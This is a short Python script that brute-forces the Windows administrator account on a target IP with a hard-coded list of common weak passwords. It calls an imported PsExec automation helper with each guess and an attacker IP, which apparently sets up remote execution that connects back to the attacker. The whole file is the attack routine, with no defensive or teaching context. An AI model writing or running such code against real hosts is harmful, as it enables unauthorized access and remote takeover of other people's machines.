import automated_psexec as ps

def d_main(ip,attacker_ip):
    pass_list ={ 'administrator': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou']}
    for user in pass_list:
        for passwd in pass_list[user]:
            status = ps.psexe(ip,user,passwd,attacker_ip)
            if(status):
                break
        if(status):
            break
